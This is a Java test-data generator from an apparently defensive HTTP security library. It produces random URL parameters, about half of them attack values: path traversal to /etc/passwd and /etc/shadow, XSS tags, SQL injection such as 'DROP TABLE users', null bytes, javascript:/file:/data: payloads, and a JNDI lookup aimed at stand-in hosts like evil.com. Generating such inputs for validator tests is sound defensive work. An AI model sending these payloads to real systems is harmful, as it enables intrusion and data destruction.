/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.TypedGenerator;
import de.cuioss.tools.security.http.data.URLParameter;

/**
 * Generates URLParameter records for testing purposes.
 * 
 * IMPROVED: Uses dynamic generation instead of hardcoded arrays for better randomness
 * and unpredictability while maintaining URL parameter attack effectiveness.
 * 
 * Implements: Task G7 from HTTP verification specification
 */
public class URLParameterGenerator implements TypedGenerator<URLParameter> {

    // Core generation parameters
    private final TypedGenerator<Integer> paramTypeGenerator = Generators.integers(0, 3);
    private final TypedGenerator<String> parameterCategories = Generators.fixedValues("page", "size", "sort", "filter");
    private final TypedGenerator<String> searchCategories = Generators.fixedValues("search", "category", "type", "status");
    private final TypedGenerator<String> dataCategories = Generators.fixedValues("id", "limit", "offset", "format");
    private final TypedGenerator<String> localeCategories = Generators.fixedValues("lang", "version", "timestamp");
    private final TypedGenerator<String> booleanValues = Generators.fixedValues("true", "false");
    private final TypedGenerator<String> sortValues = Generators.fixedValues("asc", "desc");
    private final TypedGenerator<String> formatValues = Generators.fixedValues("json", "xml", "csv", "html");
    private final TypedGenerator<String> languageValues = Generators.fixedValues("en", "de", "fr", "es", "ja");
    private final TypedGenerator<String> statusValues = Generators.fixedValues("active", "inactive", "pending", "deleted");
    private final TypedGenerator<String> systemPaths = Generators.fixedValues("etc/passwd", "windows/win.ini", "root");
    private final TypedGenerator<String> scriptTags = Generators.fixedValues("script", "img", "iframe", "style");
    private final TypedGenerator<String> sqlCommands = Generators.fixedValues("DROP TABLE", "DELETE FROM", "INSERT INTO");
    private final TypedGenerator<String> tableNames = Generators.fixedValues("users", "admin", "accounts", "sessions");
    private final TypedGenerator<String> maliciousDomains = Generators.fixedValues("evil.com", "attacker.net", "malicious.org");
    private final TypedGenerator<String> protocolSchemes = Generators.fixedValues("javascript", "file", "data");
    private final TypedGenerator<Boolean> contextSelector = Generators.booleans();
    private final TypedGenerator<Integer> numberValues = Generators.integers(1, 1000);
    private final TypedGenerator<Integer> mediumStringSize = Generators.integers(10, 30);
    private final TypedGenerator<Integer> longStringSize = Generators.integers(100, 200);
    private final TypedGenerator<Integer> attackStringSize = Generators.integers(50, 200);
    private final TypedGenerator<Integer> veryLongStringSize = Generators.integers(500, 1000);

    // Counter to ensure specific patterns appear for tests
    private int callCounter = 0;

    @Override
    public URLParameter next() {
        callCounter++;

        int type = paramTypeGenerator.next();

        String name = switch (type) {
            case 0, 1 -> generateStandardParameterName();
            case 2, 3 -> generateSpecialParameterName();
            default -> generateStandardParameterName();
        };

        String value = switch (type) {
            case 0, 2 -> generateSafeValue();
            case 1, 3 -> generateAttackValue();
            default -> generateSafeValue();
        };

        return new URLParameter(name, value);
    }

    private String generateStandardParameterName() {
        int nameType = Generators.integers(0, 3).next();
        return switch (nameType) {
            case 0 -> parameterCategories.next();
            case 1 -> searchCategories.next();
            case 2 -> dataCategories.next();
            case 3 -> localeCategories.next();
            default -> parameterCategories.next();
        };
    }

    private String generateSpecialParameterName() {
        int specialType = Generators.integers(0, 7).next();
        return switch (specialType) {
            case 0 -> ""; // Empty name
            case 1 -> "   "; // Whitespace name
            case 2 -> generateParameterWithSpecialChars();
            case 3 -> generateEncodedParameter();
            case 4 -> generateParameterWithDelimiters();
            case 5 -> generateParameterWithControlChars();
            case 6 -> generateMediumLengthParameter();
            case 7 -> generateVeryLongParameter();
            default -> "";
        };
    }

    private String generateParameterWithSpecialChars() {
        String baseName = "param";
        String[] specialChars = {" with spaces", "=equals", "&ampersand", "#hash"};
        String special = specialChars[Generators.integers(0, specialChars.length - 1).next()];
        return baseName + special;
    }

    private String generateEncodedParameter() {
        String baseName = "param";
        return baseName + "%20encoded";
    }

    private String generateParameterWithDelimiters() {
        String baseName = "param";
        String[] delimiters = {"[bracket]", "{brace}", "|pipe", "/slash", "\\backslash"};
        String delimiter = delimiters[Generators.integers(0, delimiters.length - 1).next()];
        // Ensure we sometimes generate the exact pattern the tests expect
        if (contextSelector.next() && "|pipe".equals(delimiter)) {
            return "param|pipe";
        }
        return baseName + delimiter;
    }

    private String generateParameterWithControlChars() {
        String baseName = "param";
        String[] controlChars = {"?question", ":", ";"};
        String control = controlChars[Generators.integers(0, controlChars.length - 1).next()];
        return baseName + control;
    }

    private String generateMediumLengthParameter() {
        String prefix = "param_";
        int size = mediumStringSize.next();
        return prefix + Generators.letterStrings(size, size + 10).next();
    }

    private String generateVeryLongParameter() {
        String prefix = "very_long_parameter_name_";
        int size = longStringSize.next();
        return prefix + Generators.letterStrings(size, size + 100).next();
    }

    private String generateSafeValue() {
        int valueType = Generators.integers(0, 6).next();
        return switch (valueType) {
            case 0 -> generateNumberValue();
            case 1 -> generateBooleanValue();
            case 2 -> generateSortValue();
            case 3 -> generateFormatValue();
            case 4 -> generateLanguageValue();
            case 5 -> generateStatusValue();
            case 6 -> generateTestValue();
            default -> generateNumberValue();
        };
    }

    private String generateNumberValue() {
        return String.valueOf(numberValues.next());
    }

    private String generateBooleanValue() {
        return booleanValues.next();
    }

    private String generateSortValue() {
        return sortValues.next();
    }

    private String generateFormatValue() {
        return formatValues.next();
    }

    private String generateLanguageValue() {
        return languageValues.next();
    }

    private String generateStatusValue() {
        return statusValues.next();
    }

    private String generateTestValue() {
        String[] testValues = {"test", "example", "demo", "sample"};
        return testValues[Generators.integers(0, testValues.length - 1).next()];
    }

    private String generateAttackValue() {
        int attackType = Generators.integers(0, 8).next();
        return switch (attackType) {
            case 0 -> generatePathTraversalAttack();
            case 1 -> generateXSSAttack();
            case 2 -> generateSQLInjectionAttack();
            case 3 -> generateNullByteAttack();
            case 4 -> generateJNDIAttack();
            case 5 -> generateProtocolAttack();
            case 6 -> generateLongStringAttack();
            case 7 -> generateVeryLongStringAttack();
            case 8 -> generateFilePathAttack();
            default -> generateXSSAttack();
        };
    }

    private String generatePathTraversalAttack() {
        int depth = Generators.integers(2, 5).next();
        StringBuilder path = new StringBuilder();
        for (int i = 0; i < depth; i++) {
            path.append("../");
        }
        path.append(systemPaths.next());
        return path.toString();
    }

    private String generateXSSAttack() {
        String tag = scriptTags.next();
        String payload = Generators.fixedValues("alert('xss')", "alert(1)", "prompt(1)").next();
        return "<" + tag + ">" + payload + "</" + tag + ">";
    }

    private String generateSQLInjectionAttack() {
        String command = sqlCommands.next();
        String table = tableNames.next();
        return "'; " + command + " " + table + "; --";
    }

    private String generateNullByteAttack() {
        int nullByteType = Generators.integers(0, 1).next();
        return switch (nullByteType) {
            case 0 -> "%00";
            case 1 -> "\u0000";
            default -> "%00";
        };
    }

    private String generateJNDIAttack() {
        String domain = maliciousDomains.next();
        return "${jndi:ldap://" + domain + "/}";
    }

    private String generateProtocolAttack() {
        String protocol = protocolSchemes.next();
        String payload = switch (protocol) {
            case "javascript" -> "alert(1)";
            case "file" -> "///etc/passwd";
            case "data" -> "text/html,<script>alert(1)</script>";
            default -> "alert(1)";
        };
        return protocol + ":" + payload;
    }

    private String generateLongStringAttack() {
        int size = attackStringSize.next();
        return Generators.strings("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", size, size + 150).next();
    }

    private String generateVeryLongStringAttack() {
        int size = veryLongStringSize.next();
        return Generators.strings("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", size, size + 500).next();
    }

    private String generateFilePathAttack() {
        String[] paths = {"../../../root", "..\\..\\windows\\system32", "/etc/shadow"};
        return paths[Generators.integers(0, paths.length - 1).next()];
    }

    @Override
    public Class<URLParameter> getType() {
        return URLParameter.class;
    }
}